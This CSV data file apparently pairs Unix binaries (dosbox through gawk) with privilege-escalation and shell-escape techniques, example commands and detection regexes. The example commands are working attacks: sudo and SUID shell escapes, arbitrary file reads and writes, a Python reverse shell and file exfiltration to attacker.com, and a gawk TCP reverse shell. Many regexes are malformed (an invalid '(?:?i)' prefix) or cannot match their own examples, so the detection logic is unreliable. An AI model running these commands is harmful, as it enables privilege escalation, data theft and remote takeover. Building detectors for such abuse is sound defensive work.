Name,Function,ExampleCode,Regex,Notes
dosbox,file-write,"dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dosbox,suid,"./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dosbox,sudo,"sudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dotnet,shell,"dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dotnet\s+(?:/bin/(?:sh|bash))),
dotnet,file-read,"export LFILE=file_to_read
dotnet fsi
System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dotnet\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dotnet,sudo,"sudo dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dotnet\s+(?:/bin/(?:sh|bash))),
dpkg,shell,"dpkg -l
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dpkg\s*\-l\s+(?:/bin/(?:sh|bash))),
dpkg,sudo,"sudo dpkg -l
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dpkg\s*\-l\s+(?:/bin/(?:sh|bash))),
dpkg,sudo,sudo dpkg -i x_1.0_all.deb,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dpkg\s*\-i\s+.+),
dstat,shell,"mkdir -p ~/.dstat
echo 'import os; os.execv(""/bin/sh"", [""sh""])' >~/.dstat/dstat_xxx.py
dstat --xxx",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dstat\s*\-p\s*\-\-xxx\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
dstat,sudo,"echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py
sudo dstat --xxx",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dstat\s*\-\-xxx\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
dvips,shell,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
dvips -R0 texput.dvi",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dvips\s+(?:/bin/(?:sh|bash))),
dvips,sudo,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
sudo dvips -R0 texput.dvi",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dvips\s+(?:/bin/(?:sh|bash))),
dvips,limited-suid,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
./dvips -R0 texput.dvi",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?dvips\s+(?:/bin/(?:sh|bash))),
easy_install,shell,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
easy_install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
easy_install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:getenv\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
easy_install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:\bimport\b).*(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,file-upload,"export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
easy_install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:\bimport\b).*(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \""\""\""import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\""\""\"")"" > $TF/setup.py
pip install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:\bimport\b).*(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,file-write,"export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\""$LFILE\"",\""w+\"").write(\""DATA\"")')"" > $TF/setup.py
easy_install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:\bimport\b).*(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,file-read,"echo 'print(open(""file_to_read"").read())' > $TF/setup.py
easy_install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,library-load,"echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
easy_install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,sudo,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
sudo easy_install $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?easy_install\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
eb,shell,"eb logs
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?eb\s+(?:/bin/(?:sh|bash))),
eb,sudo,"sudo eb logs
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?eb\s+(?:/bin/(?:sh|bash))),
ed,shell,"ed
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ed\s+(?:/bin/(?:sh|bash))),
ed,file-write,"ed file_to_write
a
DATA
.
w
q","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ed\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ed,file-read,"ed file_to_read
,p
q",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ed\s+.+),
ed,suid,"./ed file_to_read
,p
q",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ed\s+.+),
ed,sudo,"sudo ed
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ed\s+(?:/bin/(?:sh|bash))),
ed,limited-suid,"./ed
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ed\s+(?:/bin/(?:sh|bash))),
efax,suid,"./efax -d ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?efax\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
efax,sudo,"sudo efax -d ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?efax\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
elvish,file-read,"export LFILE=file_to_read
elvish -c 'echo (slurp <$E:LFILE)'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?elvish\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
elvish,file-write,"export LFILE=file_to_write
elvish -c 'echo DATA >$E:LFILE'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?elvish\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
elvish,shell,elvish,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?elvish\s+.+),
elvish,suid,./elvish,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?elvish\s+.+),
elvish,sudo,sudo elvish,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?elvish\s+.+),
emacs,shell,"emacs -Q -nw --eval '(term ""/bin/sh"")'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?emacs\s*\-Q\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
emacs,file-write,"emacs file_to_write
DATA
C-x C-s","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?emacs\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
emacs,file-read,emacs file_to_read,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?emacs\s+.+),
emacs,suid,"./emacs -Q -nw --eval '(term ""/bin/sh -p"")'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?emacs\s*\-Q\s*\-\-eval\s*\-p\s+(?:/bin/(?:sh|bash))),
emacs,sudo,"sudo emacs -Q -nw --eval '(term ""/bin/sh"")'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?emacs\s*\-Q\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
enscript,shell,enscript /dev/null -qo /dev/null -I '/bin/sh >&2',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?enscript\s*\-I\s+(?:/bin/(?:sh|bash))),
enscript,sudo,sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?enscript\s*\-I\s+(?:/bin/(?:sh|bash))),
env,shell,env /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?env\s+(?:/bin/(?:sh|bash))),
env,suid,./env /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?env\s*\-p\s+(?:/bin/(?:sh|bash))),
env,sudo,sudo env /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?env\s+(?:/bin/(?:sh|bash))),
eqn,file-read,"eqn ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
eqn,suid,"./eqn ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
eqn,sudo,"sudo eqn ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,file-read,"espeak -qXf ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,suid,"./espeak -qXf ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,sudo,"sudo espeak -qXf ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ex,shell,"ex
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ex\s+(?:/bin/(?:sh|bash))),
ex,file-write,"ex file_to_write
a
DATA
.
w
q","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ex\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ex,file-read,"ex file_to_read
,p
q",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ex\s+.+),
ex,sudo,"sudo ex
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ex\s+(?:/bin/(?:sh|bash))),
exiftool,file-read,"exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
exiftool,file-write,exiftool -filename=$LFILE $INPUT,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
exiftool,sudo,sudo exiftool -filename=$LFILE $INPUT,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,file-read,"expand ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,suid,"./expand ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,sudo,"sudo expand ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expect,file-read,expect $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?expect\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expect,shell,expect -c 'spawn /bin/sh;interact',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s+(?:/bin/(?:sh|bash))),
expect,suid,./expect -c 'spawn /bin/sh -p;interact',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
expect,sudo,sudo expect -c 'spawn /bin/sh;interact',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s+(?:/bin/(?:sh|bash))),
facter,shell,"echo 'exec(""/bin/sh"")' > $TF/x.rb
FACTERLIB=$TF facter","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?facter\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
facter,sudo,"echo 'exec(""/bin/sh"")' > $TF/x.rb
sudo FACTERLIB=$TF facter","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?facter\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
file,file-read,file -f $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
file,file-read,file -m $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?file\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
file,suid,./file -f $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
file,sudo,sudo file -f $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
find,shell,find . -exec /bin/sh \; -quit,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?find\s+(?:/bin/(?:sh|bash))),
find,suid,./find . -exec /bin/sh -p \; -quit,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?find\s*\-p\s+(?:/bin/(?:sh|bash))),
find,sudo,sudo find . -exec /bin/sh \; -quit,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?find\s+(?:/bin/(?:sh|bash))),
find,file-write,"find / -fprintf ""$FILE"" DATA -quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?find\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
finger,file-upload,"finger ""$(base64 $LFILE)@$RHOST""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?finger\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
finger,file-download,"finger x@$RHOST | base64 -d > ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?finger\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fish,shell,fish,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fish\s+.+),
fish,suid,./fish,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fish\s+.+),
fish,sudo,sudo fish,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fish\s+.+),
flock,shell,flock -u / /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s+(?:/bin/(?:sh|bash))),
flock,suid,./flock -u / /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s*\-p\s+(?:/bin/(?:sh|bash))),
flock,sudo,sudo flock -u / /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s+(?:/bin/(?:sh|bash))),
fmt,file-read,"fmt -pNON_EXISTING_PREFIX ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fmt,file-read,"fmt -999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fmt,suid,"./fmt -999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fmt,sudo,"sudo fmt -999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fold,file-read,"fold -w99999999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fold,suid,"./fold -w99999999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fold,sudo,"sudo fold -w99999999 ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fping,file-read,fping -f $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fping\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fping,sudo,sudo fping -f $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?fping\s*\-f\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ftp,shell,"ftp
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ftp\s+(?:/bin/(?:sh|bash))),
ftp,file-upload,"ftp $RHOST
put file_to_send","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ftp,file-download,"ftp $RHOST
get file_to_get","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ftp,sudo,"sudo ftp
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?ftp\s+(?:/bin/(?:sh|bash))),
gawk,shell,"gawk 'BEGIN {system(""/bin/sh"")}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,non-interactive-reverse-shell,"gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
